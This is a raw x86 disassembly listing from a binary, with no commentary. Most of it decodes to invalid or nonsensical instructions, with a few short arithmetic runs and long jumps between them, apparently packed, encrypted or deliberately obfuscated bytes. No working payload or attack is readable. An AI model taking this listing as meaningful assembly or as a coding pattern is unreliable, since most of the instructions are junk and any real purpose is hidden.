  40b9fc:	fs pop ecx
  40b9fe:	fcom   QWORD PTR [ecx]
  40ba00:	retf   0xfb9e
  40ba03:	adc    al,0xdf
  40ba05:	or     eax,0x81294b93
  40ba0a:	push   DWORD PTR [esi-0x179d8789]
  40ba10:	pop    ebp
  40ba11:	pushf  
  40ba12:	inc    ebp
  40ba13:	bound  ebp,QWORD PTR ds:0xdfac8203
  40ba19:	retf   
  40ba1a:	jbe    0x40b9a3
  40ba1c:	rol    DWORD PTR [edi-0x69b8cc89],1
  40ba22:	mov    al,0x6
  40ba24:	xchg   ebx,eax
  40ba25:	out    dx,eax
  40ba26:	pop    ss
  40ba27:	jp     0x40ba0f
  40ba29:	rol    esp,1
  40ba2b:	mov    ds:0x871aa8d8,al
  40ba30:	sub    bl,dl
  40ba32:	ret    
  40ba33:	dec    esi
  40ba34:	mov    dh,0x54
  40ba36:	adc    ecx,DWORD PTR [edx-0x40c6367]
  40ba3c:	xchg   esp,eax
  40ba3d:	lock sub BYTE PTR [ebx],ah
  40ba40:	addr16 repnz retf 
  40ba43:	lock dec ebx
  40ba45:	stos   DWORD PTR es:[edi],eax
  40ba46:	cmp    edi,ebp
  40ba48:	mov    esp,0xc352fc11
  40ba4d:	and    esp,DWORD PTR [ebp+0x22]
  40ba50:	adc    ch,al
  40ba52:	sbb    al,0xaf
  40ba54:	or     DWORD PTR [edi+0x4916ea31],esp
  40ba5a:	inc    ebp
  40ba5b:	ror    DWORD PTR [eax],1
  40ba5d:	adc    al,0x45
  40ba5f:	sbb    esp,DWORD PTR [ebp-0x59ce6a15]
  40ba65:	stos   DWORD PTR es:[edi],eax
  40ba66:	pop    ebp
  40ba67:	jp     0x40ba52
  40ba69:	sub    eax,0xf977e648
  40ba6e:	cwde   
  40ba6f:	cmp    bh,ah
  40ba71:	sub    BYTE PTR [edi+0x67d683ce],ch
  40ba77:	and    BYTE PTR [edx+0x670b2aaa],0xe
  40ba7e:	retf   
  40ba7f:	add    edx,DWORD PTR [edx-0x74]
  40ba82:	and    ebp,DWORD PTR [ecx]
  40ba84:	cmp    BYTE PTR [ecx+0x63711400],dl
  40ba8a:	stc    
  40ba8b:	ins    WORD PTR es:[edi],dx
  40ba8d:	push   ebx
  40ba8e:	(bad)  
  40ba8f:	out    dx,eax
  40ba90:	cmp    DWORD PTR [eax-0x58],ecx
  40ba93:	dec    esi
  40ba94:	or     ebx,DWORD PTR [ebx]
  40ba96:	sbb    esp,DWORD PTR [edi]
  40ba98:	neg    DWORD PTR [ebp-0x31]
  40ba9b:	mov    bl,0x19
  40ba9d:	retf   0xcd9c
  40baa0:	(bad)  
  40baa1:	adc    eax,0x558b96d9
  40baa6:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	mov    bh,0x44
  40bace:	lods   al,BYTE PTR ds:[esi]
  40bacf:	stos   DWORD PTR es:[edi],eax
  40bad0:	xchg   ebp,eax
  40bad1:	cmp    DWORD PTR [esp+edi*2-0x36],0x79
  40bad6:	jl     0x40bb54
  40bad8:	add    eax,0xf1ba9dd7
  40badd:	cmp    esi,DWORD PTR [esi]
  40badf:	outs   dx,BYTE PTR ds:[esi]
  40bae0:	pop    ecx
  40bae1:	cmp    al,0xc2
  40bae3:	mov    dl,0x44
  40bae5:	(bad)  
  40bae6:	rcr    DWORD PTR [esi-0x24],cl
  40bae9:	jnp    0x40bb03
  40baeb:	pop    ebp
  40baec:	cmp    al,BYTE PTR [edi]
  40baee:	stos   BYTE PTR es:[edi],al
  40baef:	inc    eax
  40baf0:	or     al,0x3f
  40baf2:	loop   0x40bb0f
  40baf4:	not    eax
  40baf6:	cmp    dl,BYTE PTR [edx]
  40baf8:	sbb    eax,0xdf4c9983
  40bafd:	or     al,0x23
  40baff:	xlat   BYTE PTR ds:[ebx]
  40bb00:	jno    0x40bb35
  40bb02:	fild   WORD PTR [esi+0x53]
  40bb05:	jmp    0x40bb79
  40bb07:	inc    esp
  40bb08:	and    DWORD PTR [esi+0x43ab2f19],esi
  40bb0e:	cmp    ch,BYTE PTR [ebx+0x5b4e4292]
  40bb14:	mov    esi,0x199ae835
  40bb19:	not    BYTE PTR [eax-0x1c]
  40bb1c:	jp     0x40baaf
  40bb1e:	cdq    
  40bb1f:	fnsave [esi]
  40bb21:	out    dx,eax
  40bb22:	in     al,dx
  40bb23:	(bad)  
  40bb24:	cmp    BYTE PTR [ecx],dh
  40bb26:	mov    ebx,DWORD PTR [ebx+esi*1]
  40bb29:	pop    ss
  40bb2a:	xchg   edx,eax
  40bb2b:	cmp    eax,0x245c98db
  40bb30:	mov    BYTE PTR [eax+0x5b],bh
  40bb33:	mov    cl,0x86
  40bb35:	push   ebx
  40bb36:	push   cs
  40bb37:	xchg   edi,eax
  40bb38:	retf   
  40bb39:	repnz icebp 
  40bb3b:	outs   dx,DWORD PTR ds:[esi]
  40bb3c:	ret    0x13c
  40bb3f:	call   0xf3ae:0x80191d45
  40bb46:	inc    ebp
  40bb47:	mov    ebp,0x62a24bee
  40bb4c:	sbb    al,0xe8
  40bb4e:	dec    eax
  40bb4f:	pop    edx
  40bb50:	lea    esi,[ebp*2+0x60c939ed]
  40bb57:	ds push edx
  40bb59:	ss sahf 
  40bb5b:	out    dx,al
  40bb5c:	jnp    0x40bb8f
  40bb5e:	xchg   BYTE PTR [eax+edi*4-0x270d7f1],bl
  40bb65:	loope  0x40bbba
  40bb67:	push   ecx
  40bb68:	ret    0xe348
  40bb6b:	test   DWORD PTR [esi],ebx
  40bb6d:	and    eax,0x6335e4e5
  40bb72:	or     cl,BYTE PTR [edx]
  40bb74:	sub    BYTE PTR [esi-0x24],dh
  40bb77:	sub    al,0xe7
  40bb79:	pop    ebx
  40bb7a:	adc    DWORD PTR [esi-0x64],0xffffffa2
  40bb7e:	pop    es
  40bb7f:	jmp    0x40bbbb
  40bb81:	and    eax,0x8f3a649
  40bb86:	jo     0x40bb44
  40bb88:	mov    eax,ds:0xf1b04074
  40bb8d:	jae    0x40bbf3
  40bb8f:	fadd   DWORD PTR [ecx-0x79]
  40bb92:	dec    edi
  40bb93:	or     ebx,ecx
  40bb95:	jno    0x40bbe7
  40bb97:	add    BYTE PTR [edi+0x4828338b],bl
  40bb9d:	std    
  40bb9e:	dec    edi
  40bb9f:	jne    0x40bb3b
  40bba1:	int3   
  40bba2:	popf   
  40bba3:	(bad)  
  40bba4:	(bad)  
  40bba5:	ja     0x40bbdd
  40bba7:	jne    0x40bb39
  40bba9:	retf   
  40bbaa:	in     al,0xe
  40bbac:	cmp    al,0x3e
  40bbae:	mov    ebp,0xa4a49233
  40bbb3:	not    DWORD PTR [edi-0x43]
  40bbb6:	sub    al,0xab
  40bbb8:	push   0xc73aa274
  40bbbd:	lods   al,BYTE PTR ds:[esi]
  40bbbe:	retf   
  40bbbf:	xchg   edx,eax
  40bbc0:	mov    esp,0xb06b8657
  40bbc5:	xchg   esp,eax
  40bbc6:	das    
  40bbc7:	aaa    
  40bbc8:	pusha  
  40bbc9:	pop    eax
  40bbca:	sbb    eax,0x4d506dff
  40bbcf:	cmp    ebp,DWORD PTR [edx]
  40bbd1:	test   BYTE PTR [ecx-0x23dff00f],ch
  40bbd7:	cmp    bh,ch
  40bbd9:	xchg   edi,eax
  40bbda:	or     DWORD PTR [edx],esi
  40bbdc:	retf   0xbca1
  40bbdf:	mov    ah,0xc1
  40bbe1:	add    DWORD PTR [eax+eax*1],edi
  40bbe4:	outs   dx,BYTE PTR ds:[esi]
  40bbe5:	jmp    0xff0cf0ae
  40bbea:	pop    es
  40bbeb:	sbb    esp,DWORD PTR [eax+edi*2]
  40bbee:	sahf   
  40bbef:	add    ebp,DWORD PTR [edi]
  40bbf1:	fadd   DWORD PTR [ebx+ecx*2-0xd22431c]
  40bbf8:	dec    ebx
  40bbf9:	ins    BYTE PTR es:[edi],dx
  40bbfa:	adc    al,bl
  40bbfc:	mov    edx,0x20ed7101
  40bc01:	jmp    0x40bc1a
  40bc03:	test   DWORD PTR [edi+eax*1],ebp
  40bc06:	pop    eax
  40bc07:	cdq    
  40bc08:	add    al,0x34
  40bc0a:	daa    
  40bc0b:	cld    
  40bc0c:	mov    bh,0xb
  40bc0e:	push   edx
  40bc0f:	retf   0xa4e
  40bc12:	imul   ebp,DWORD PTR [eax+ecx*1],0x704a1d85
  40bc19:	ret    0xb
  40bc1c:	pop    esi
  40bc1d:	pop    edx
  40bc1e:	add    ch,BYTE PTR [esp+ecx*4]
  40bc21:	(bad)  
  40bc22:	out    dx,al
  40bc23:	or     DWORD PTR [eax+0xc333ff8],0xffffffbd
  40bc2a:	neg    DWORD PTR [eax]
  40bc2c:	and    eax,0x34b985e
  40bc31:	stos   BYTE PTR es:[edi],al
  40bc32:	xor    bl,bl
  40bc34:	in     eax,dx
  40bc35:	out    dx,al
  40bc36:	imul   esp,DWORD PTR [ecx-0x787f0fab],0x270ff765
  40bc40:	pop    esi
  40bc41:	daa    
  40bc42:	(bad)  
  40bc43:	sbb    ecx,DWORD PTR [ecx+0x24]
  40bc46:	xor    ebp,DWORD PTR [esi]
  40bc48:	inc    ebp
  40bc49:	push   es
  40bc4a:	(bad)  
  40bc4b:	mul    BYTE PTR [edx]
  40bc4d:	xor    al,0xcb
  40bc4f:	cmp    DWORD PTR [ebp-0x1736f4d7],0xbf5ae68
  40bc59:	jg     0x40bc24
  40bc5b:	ror    DWORD PTR [ebx+ebp*2-0x4e],1
  40bc5f:	sbb    BYTE PTR [esi+0x6e],ah
  40bc62:	push   0xffffff94
  40bc64:	xchg   edx,eax
  40bc65:	aam    0x86
  40bc67:	jg     0x40bc83
  40bc69:	jmp    0x607ebb26
  40bc6e:	popa   
  40bc6f:	stc    
  40bc70:	lods   al,BYTE PTR ds:[esi]
  40bc71:	xchg   BYTE PTR [esi-0x4573d96b],dh
  40bc77:	fcom   st(7)
  40bc79:	rcr    esp,0x6
  40bc7c:	adc    BYTE PTR [ecx-0x16cf5809],bl
  40bc82:	mov    edx,0xc1a81936
  40bc87:	sbb    BYTE PTR [ebp+0x67e695d2],ch
  40bc8d:	xchg   ebx,eax
  40bc8e:	dec    ecx
  40bc8f:	mov    bl,0xdc
  40bc91:	dec    edx
  40bc92:	xchg   esp,eax
  40bc93:	inc    edi
  40bc94:	mov    bl,0xc6
  40bc96:	push   ds
  40bc97:	or     DWORD PTR [edx-0x2336b4d7],eax
  40bc9d:	jge    0x40bc3b
  40bc9f:	inc    ecx
  40bca0:	dec    ecx
  40bca1:	mov    esi,0x505751b0
  40bca6:	std    
  40bca7:	stos   BYTE PTR es:[edi],al
  40bca8:	cs in  al,0x70
  40bcab:	inc    edi
  40bcac:	add    DWORD PTR [edx+0x69],eax
  40bcaf:	lock mov BYTE PTR [edi-0x2e53235],0x7f
  40bcb7:	in     eax,0xe2
  40bcb9:	sub    al,0x18
  40bcbb:	jno    0x40bcf2
  40bcbd:	mov    edx,0x3c1de506
  40bcc2:	retf   0xc54c
  40bcc5:	xchg   ebp,eax
  40bcc6:	mov    eax,ds:0x10c20cd1
  40bccb:	pop    esi
  40bccc:	ficom  WORD PTR [edi+0x2845922a]
  40bcd2:	mov    al,ds:0x3faa7a7
  40bcd7:	ret    0xb37
  40bcda:	cdq    
  40bcdb:	mov    ds:0x4dd68b33,al
  40bce0:	push   ecx
  40bce1:	(bad)  
  40bce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bce3:	mov    dh,0x2e
  40bce5:	(bad)  [edi]
  40bce7:	mov    bh,0xc2
  40bce9:	cli    
  40bcea:	jns    0x40bc87
  40bcec:	xor    BYTE PTR [esp+esi*8+0x4f],bl
  40bcf0:	mov    cl,bh
  40bcf2:	cdq    
  40bcf3:	cmp    dl,BYTE PTR [eax-0x388f1638]
  40bcf9:	xor    BYTE PTR fs:[edi],bh
  40bcfc:	pop    ecx
  40bcfd:	gs xchg edi,eax
  40bcff:	xchg   edx,eax
  40bd00:	or     ecx,DWORD PTR [edx+ebx*4]
  40bd03:	imul   ebx,DWORD PTR [ebp-0x58],0x60fcf425
  40bd0a:	mov    WORD PTR [ebx*8-0x14da398c],?
  40bd11:	mov    gs,WORD PTR [esi+0x2d8a433e]
  40bd17:	ret    0x102e
  40bd1a:	pop    edi
  40bd1b:	mul    BYTE PTR [ebp-0x34]
  40bd1e:	jmp    0xfce8d870
  40bd23:	je     0x40bcdb
  40bd25:	sbb    esp,ecx
  40bd27:	sahf   
  40bd28:	xchg   edx,eax
  40bd29:	xchg   ebx,eax
  40bd2a:	ins    DWORD PTR es:[edi],dx
  40bd2b:	(bad)  
  40bd2c:	mov    esi,0x362ddeb3
  40bd31:	sbb    edx,ebx
  40bd33:	sub    BYTE PTR ds:0x1c857879,dl
  40bd39:	scas   eax,DWORD PTR es:[edi]
  40bd3a:	xor    edi,DWORD PTR [ebx]
  40bd3c:	lock gs fwait
  40bd3f:	mov    ebx,0xebe520a
  40bd44:	sbb    cl,BYTE PTR [eax]
  40bd46:	sbb    DWORD PTR [edi-0x19e3c679],esp
  40bd4c:	xchg   BYTE PTR [ecx-0x237ca8e8],al
  40bd52:	adc    BYTE PTR [ecx-0x35],0x8d
  40bd56:	inc    ebp
  40bd57:	in     al,0xf
  40bd59:	push   ebp
  40bd5a:	imul   edi,DWORD PTR [ebx],0xffffffec
  40bd5d:	outs   dx,BYTE PTR ds:[esi]
  40bd5e:	aaa    
  40bd5f:	cwde   
  40bd60:	aaa    
  40bd61:	loop   0x40bd27
  40bd63:	stos   DWORD PTR es:[edi],eax
  40bd64:	es ret 
  40bd66:	ret    0xbf79
  40bd69:	nop
  40bd6a:	arpl   WORD PTR [esi+0xc],si
  40bd6d:	sahf   
  40bd6e:	js     0x40bcfd
  40bd70:	pop    esp
  40bd71:	fisttp DWORD PTR [edi-0xd06b8c1]
  40bd77:	xchg   esi,eax
  40bd78:	loopne 0x40bd13
  40bd7a:	ret    
  40bd7b:	pusha  
  40bd7c:	mov    eax,DWORD PTR [ebx]
  40bd7e:	jl     0x40bdbb
  40bd80:	jecxz  0x40bd55
  40bd82:	in     eax,dx
  40bd83:	mov    esi,0x2a7502f0
  40bd88:	sbb    dl,BYTE PTR [eax+eax*1]
  40bd8b:	aam    0x2f
  40bd8d:	aad    0x56
  40bd8f:	daa    
  40bd90:	daa    
  40bd91:	pop    ds
  40bd92:	inc    ebx
  40bd93:	je     0x40bdff
  40bd95:	mov    bh,0xcc
  40bd97:	pop    ebx
  40bd98:	es (bad) 
  40bd9a:	iret   
  40bd9b:	inc    ebp
  40bd9c:	nop
  40bd9d:	dec    edi
  40bd9e:	adc    DWORD PTR [edx-0x5262dc02],ebx
  40bda4:	inc    edi
  40bda5:	xchg   esp,eax
  40bda6:	or     bl,bh
  40bda8:	adc    edi,0x21
  40bdab:	push   edi
  40bdac:	push   es
  40bdad:	in     eax,0x56
  40bdaf:	mov    ch,0x86
  40bdb1:	test   eax,0x5653f647
  40bdb6:	(bad)  
  40bdb8:	mov    esi,0xa1564b8f
  40bdbd:	mov    bh,0xe8
  40bdbf:	bound  ebp,QWORD PTR [ecx-0x558c6428]
  40bdc5:	arpl   WORD PTR [ecx-0x53],sp
  40bdc8:	clc    
  40bdc9:	jle    0x40bda0
  40bdcb:	(bad)  [ebx]
  40bdcd:	iret   
  40bdce:	stos   DWORD PTR es:[edi],eax
  40bdcf:	xchg   edx,eax
  40bdd0:	jle    0x40bd81
  40bdd2:	shl    al,cl
  40bdd4:	mov    fs,WORD PTR fs:0x98ea26
  40bddb:	rol    DWORD PTR [ebx],1
  40bddd:	imul   ebp,DWORD PTR [edi+0x5f6776],0x954355c5
  40bde7:	jmp    0xcf2d:0x45ed6d34
  40bdee:	ds push es
  40bdf0:	mov    bl,0x28
  40bdf2:	inc    eax
  40bdf3:	outs   dx,BYTE PTR ds:[esi]
  40bdf4:	in     al,dx
  40bdf5:	pop    ecx
  40bdf6:	and    al,0xee
  40bdf8:	popa   
  40bdf9:	ret    
  40bdfa:	pop    edx
  40bdfb:	int    0xf8
  40bdfd:	out    0x91,eax
  40bdff:	pop    es
  40be00:	test   BYTE PTR [eax-0x695f10f2],cl
  40be06:	pop    ebx
  40be07:	push   ebp
  40be08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be09:	in     al,0xb2
  40be0b:	ficomp WORD PTR [esi+0x78]
  40be0e:	loop   0x40bddd
  40be10:	inc    ecx
  40be11:	mov    edx,0xb4978ff9
  40be16:	aam    0x63
  40be18:	imul   ebp,DWORD PTR [ebx-0x32],0xffffffbe
  40be1c:	or     ebp,DWORD PTR [ebp-0x2c29f71f]
  40be22:	dec    eax
  40be23:	(bad)  
  40be24:	pop    edx
  40be25:	fcmovu st,st(7)
  40be27:	adc    ebx,DWORD PTR [ebx-0x60]
  40be2a:	adc    ebx,DWORD PTR fs:[eax+ebx*4-0x77]
  40be2f:	push   ebp
  40be30:	fmul   QWORD PTR [ebx+0x5503f855]
  40be36:	rol    bh,0x45
  40be39:	call   0xf8dd4373
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	stc    
  40be66:	frstor [esi]
  40be68:	add    al,0x63
  40be6a:	mov    WORD PTR [esp+edi*2-0x36],?
  40be6e:	jns    0x40beec
  40be70:	jl     0x40be5b
  40be72:	imul   ecx,eax,0xada7dc48
  40be78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be79:	test   BYTE PTR [ebp+0x24e8d482],dl
  40be7f:	js     0x40be47
  40be81:	stos   DWORD PTR es:[edi],eax
  40be82:	adc    BYTE PTR [ecx+0x7dd5a44],bl
  40be88:	jne    0x40bf03
  40be8a:	add    DWORD PTR [edx+0x3cc7dfd8],edi
  40be90:	shl    BYTE PTR [esi+0x1677cccc],0xea
  40be97:	xor    BYTE PTR [ebp-0xed9510a],dl
  40be9d:	ds jge 0x40bed8
  40bea0:	mov    ebx,0x746aeb0c
  40bea5:	aaa    
  40bea6:	jns    0x40bf10
  40bea8:	mov    al,ds:0x9adde12a
  40bead:	dec    ebp
  40beae:	adc    WORD PTR [ebx+0x66],0x29
  40beb3:	dec    esp
  40beb4:	ret    0xcd72
  40beb7:	popf   
  40beb8:	daa    
  40beb9:	daa    
  40beba:	js     0x40beff
  40bebc:	cmp    eax,0xdb40f4d
  40bec1:	cwde   
  40bec2:	mov    bl,0xbc
  40bec4:	repnz (bad) 
  40bec6:	or     BYTE PTR [edx+0x5f],bl
  40bec9:	cdq    
  40beca:	scas   al,BYTE PTR es:[edi]
  40becb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40becc:	jne    0x40bf3a
  40bece:	adc    al,0xc8
  40bed0:	dec    ebx
  40bed1:	mov    ds:0x2dbde67,al
  40bed6:	addr16 inc eax
  40bed8:	mov    gs,WORD PTR [edi-0x1d]
  40bedb:	jl     0x40bf41
  40bedd:	scas   eax,DWORD PTR es:[edi]
  40bede:	popf   
  40bedf:	xchg   ebx,edi
  40bee1:	sbb    dl,BYTE PTR ds:0x3f415f9e
  40bee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee8:	scas   al,BYTE PTR es:[edi]
  40bee9:	mov    esi,ebx
  40beeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beec:	popf   
  40beed:	push   edx
  40beee:	shl    BYTE PTR [ebx+eax*8+0x7e],1
  40bef2:	jp     0x40bed1
  40bef4:	retf   0xb6f1
  40bef7:	sub    dh,bh
  40bef9:	push   eax
  40befa:	jmp    0xe9838974
  40beff:	dec    ebp
  40bf00:	mov    ebp,0x84884557
  40bf05:	inc    ecx
  40bf06:	sub    BYTE PTR [ebp+0x9],ch
  40bf09:	icebp  
  40bf0a:	mov    ds:0xe15fa78a,eax
  40bf0f:	fidiv  DWORD PTR [edi-0x36]
  40bf12:	xor    DWORD PTR [edx],0x6b
  40bf15:	sub    eax,DWORD PTR [edi+edx*1]
  40bf18:	mov    WORD PTR [edi-0x3ad53635],?
  40bf1e:	push   ds
  40bf1f:	iret   
  40bf20:	push   es
  40bf21:	mov    dl,0xfd
  40bf23:	iret   
  40bf24:	int    0x34
  40bf26:	mov    edi,0x3670d49a
  40bf2b:	ret    
  40bf2c:	cli    
  40bf2d:	(bad)  
  40bf2e:	push   ds
  40bf2f:	lea    esi,[eax-0x6e]
  40bf32:	jb     0x40bf3f
  40bf34:	adc    esp,DWORD PTR [esi]
  40bf36:	pop    esi
  40bf37:	add    bh,bl
  40bf39:	jmp    0xf108290b
  40bf3e:	sbb    eax,0x3499b55f
  40bf43:	mov    esi,0xe4e887f0
  40bf48:	cdq    
  40bf49:	imul   esp,DWORD PTR ss:[ebp+0x11c2e25e],0x48
  40bf51:	or     BYTE PTR [eax-0x6b],0x6e
  40bf55:	inc    eax
  40bf56:	jns    0x40bf92
  40bf58:	(bad)  ds:0x5e17f26c
  40bf5e:	lea    ebp,[ebx+0x4e]
  40bf61:	or     eax,0x66fe90eb
  40bf66:	aam    0xd4
  40bf68:	icebp  
  40bf69:	push   0xffffff9d
  40bf6b:	(bad)  
  40bf6d:	lock fmul DWORD PTR [ecx+0x3e]
  40bf71:	pop    ebx
  40bf72:	cwde   
  40bf73:	in     eax,dx
  40bf74:	mov    DWORD PTR [edi-0x11ea8017],eax
  40bf7a:	leave  
  40bf7b:	pop    esp
  40bf7c:	add    DWORD PTR [edi],ebx
  40bf7e:	sbb    ebx,DWORD PTR [eax-0x58b6860e]
  40bf84:	and    eax,0xab47fd84
  40bf89:	out    dx,al
  40bf8a:	or     eax,0x7e81ab4d
  40bf8f:	adc    eax,0x14a1c640
  40bf94:	dec    edi
  40bf95:	cmp    BYTE PTR [ecx+0x21],dl
  40bf98:	jle    0x40bf5e
  40bf9a:	push   es
  40bf9b:	pop    esi
  40bf9c:	mov    cl,0x2e
  40bf9e:	hlt    
  40bf9f:	dec    esp
  40bfa0:	xchg   DWORD PTR [edi+0x9],ebp
  40bfa3:	(bad)  
  40bfa4:	in     al,0x5a
  40bfa6:	mov    bl,0xed
  40bfa8:	pop    esi
  40bfa9:	jle    0x40bfcd
  40bfab:	out    0x3b,eax
  40bfad:	lahf   
  40bfae:	jbe    0x40bf6b
  40bfb0:	in     al,0xa2
  40bfb2:	sti    
  40bfb3:	ja     0x40bff6
  40bfb5:	stos   DWORD PTR es:[edi],eax
  40bfb6:	xlat   BYTE PTR ds:[ebx]
  40bfb7:	adc    ah,BYTE PTR [edx+0x5bf07987]
  40bfbd:	fsubr  QWORD PTR [esi+0x6647b26d]
  40bfc3:	mov    esi,0x6a38701b
  40bfc8:	das    
  40bfc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfca:	(bad)  
  40bfcc:	mov    al,0x28
  40bfce:	and    al,0x7e
  40bfd0:	mov    ecx,0xf9d91c62
  40bfd5:	aad    0x10
  40bfd7:	addr16 inc ebp
  40bfd9:	ret    
  40bfda:	push   0x26
  40bfdc:	icebp  
  40bfdd:	fstp   QWORD PTR [ebx+ecx*1-0x59901d7d]
  40bfe4:	xchg   BYTE PTR [edi+0x321ad5ee],dh
  40bfea:	mov    eax,0xe73fa3e4
  40bfef:	push   eax
  40bff0:	xor    cl,BYTE PTR [ebx+0x11]
  40bff3:	sbb    dl,bl
  40bff5:	popa   
  40bff6:	jo     0x40bf93
  40bff8:	pop    ebp
  40bff9:	adc    DWORD PTR ds:0x1fb0e2bb,0x25e81ff3
  40c003:	ret    
  40c004:	call   0xc6d05cbe
  40c009:	cmp    ebx,DWORD PTR [eax+0xf]
  40c00c:	aam    0x85
  40c00e:	cdq    
  40c00f:	sbb    BYTE PTR [ebx+0x62],dh
  40c012:	fld    DWORD PTR [ecx-0x4a76a4a3]
  40c018:	jno    0x40c02c
  40c01a:	jp     0x40bfb5
  40c01c:	ret    0x5499
  40c01f:	push   ecx
  40c020:	int    0xd0
  40c022:	xchg   DWORD PTR [esi-0x340b4c0f],eax
  40c028:	adc    eax,0x72eb20ae
  40c02d:	lods   al,BYTE PTR ds:[esi]
  40c02e:	fisttp QWORD PTR [edi-0x6f270d34]
  40c034:	ds in  al,dx
  40c036:	cdq    
  40c037:	stos   DWORD PTR es:[edi],eax
  40c038:	outs   dx,DWORD PTR ds:[esi]
  40c039:	out    0xc4,eax
  40c03b:	mov    ds:0x23f3bed7,eax
  40c040:	xchg   DWORD PTR [ebp+eax*8+0x74],ebx
  40c044:	xor    ecx,DWORD PTR [eax-0x5b075f92]
  40c04a:	push   0xffffffe0
  40c04c:	ret    
  40c04d:	mov    al,BYTE PTR [edx]
  40c04f:	stos   DWORD PTR es:[edi],eax
  40c050:	repz mov eax,0x26fa9db6
  40c056:	addr16 in al,dx
  40c058:	or     cl,BYTE PTR [ecx]
  40c05a:	cmp    al,0x6b
  40c05c:	fistp  QWORD PTR [edi+0x69]
  40c05f:	dec    ecx
  40c060:	xchg   esi,eax
  40c061:	sbb    ebp,edx
  40c063:	mov    WORD PTR [edi],ss
  40c065:	sti    
  40c066:	dec    edi
  40c067:	fidiv  WORD PTR [ebx-0x13ca2764]
  40c06d:	xchg   esp,eax
  40c06e:	leave  
  40c06f:	fs push eax
  40c071:	jns    0x40bff7
  40c073:	and    bl,cl
  40c075:	sub    esi,DWORD PTR [edx-0x549aee9d]
  40c07b:	pushf  
  40c07c:	(bad)  
  40c07d:	or     al,0xc
  40c07f:	bound  esp,QWORD PTR [ebx]
  40c081:	or     al,0x8b
  40c083:	out    dx,al
  40c084:	mov    fs,WORD PTR [edx+0x3]
  40c087:	stc    
  40c088:	pop    edi
  40c089:	scas   eax,DWORD PTR es:[edi]
  40c08a:	mov    bh,0xc3
  40c08c:	addr16 push esp
  40c08e:	(bad)  
  40c08f:	repz jle 0x40c110
  40c092:	push   edx
  40c093:	or     al,0x9c
  40c095:	fst    DWORD PTR [esi+0xe]
  40c098:	push   ecx
  40c099:	sub    DWORD PTR ds:0x6808e9a2,edx
  40c09f:	xchg   edx,eax
  40c0a0:	idiv   BYTE PTR [ebp-0x3c1ae24]
  40c0a6:	mov    BYTE PTR [edx],0x9e
  40c0a9:	adc    esi,DWORD PTR [esi]
  40c0ab:	fcomp  DWORD PTR [ebp+esi*4+0x2df50518]
  40c0b2:	aaa    
  40c0b3:	enter  0x9a8f,0xd1
  40c0b7:	and    BYTE PTR [ebx-0xf0660a],dl
  40c0bd:	(bad)  
  40c0bf:	(bad)  
  40c0c0:	or     DWORD PTR [ecx],ebp
  40c0c2:	push   esp
  40c0c3:	fwait
  40c0c4:	jnp    0x40c0d7
  40c0c6:	push   0x3e63e915
  40c0cb:	cmp    eax,0xf3ad9db9
  40c0d0:	shl    BYTE PTR [ebx+0x62],cl
  40c0d3:	add    al,0xe
  40c0d5:	mov    ds:0x22901fc5,al
  40c0da:	pop    ss
  40c0db:	dec    DWORD PTR fs:[edi]
  40c0de:	or     bl,bh
  40c0e0:	nop
  40c0e1:	in     eax,0xa7
  40c0e3:	pop    ebp
  40c0e4:	push   ss
  40c0e5:	lods   al,BYTE PTR ds:[esi]
  40c0e6:	push   esp
  40c0e7:	test   al,0x10
  40c0e9:	mov    esi,0xfb719abf
  40c0ee:	or     ah,ah
  40c0f0:	clc    
  40c0f1:	sbb    eax,0x60e22aa2
  40c0f6:	cmp    al,0xc4
  40c0f8:	mov    bl,0x48
  40c0fa:	out    dx,eax
  40c0fb:	aad    0x9d
  40c0fd:	jmp    0xd7b2:0x95791736
  40c104:	test   al,0xc8
  40c106:	xchg   esp,edx
  40c108:	push   edi
  40c109:	jle    0x40c0e4
  40c10b:	dec    edx
  40c10c:	push   ss
  40c10d:	lea    esp,[ebx+0x5e]
  40c110:	mov    ecx,0xa00b4641
  40c115:	xor    ebp,ecx
  40c117:	rcl    DWORD PTR ds:0xc95591b7,1
  40c11d:	jle    0x40c192
  40c11f:	xor    dh,dl
  40c121:	push   ebx
  40c122:	test   dh,dh
  40c124:	scas   eax,DWORD PTR es:[edi]
  40c125:	adc    esp,DWORD PTR [edi+0x29]
  40c128:	popf   
  40c129:	add    dh,BYTE PTR [edi+0x1a179eae]
  40c12f:	inc    dl
  40c131:	dec    eax
  40c132:	sub    esi,DWORD PTR ds:0x13f0bb50
  40c138:	add    dl,al
  40c13a:	aaa    
  40c13b:	ja     0x40c19f
  40c13d:	repz imul edi,DWORD PTR [eax+edx*1],0x4f
  40c142:	sbb    DWORD PTR [edi+ebx*4],0x9b6078df
  40c149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c14a:	pushf  
  40c14b:	cmc    
  40c14c:	xor    dh,bh
  40c14e:	test   BYTE PTR [edx-0x59],cl
  40c151:	mov    cs,WORD PTR [eax+0x3c]
  40c154:	push   ss
  40c155:	pop    eax
  40c156:	retf   
  40c157:	(bad)  
  40c158:	pop    ebx
  40c159:	rol    BYTE PTR [edi+edx*1],cl
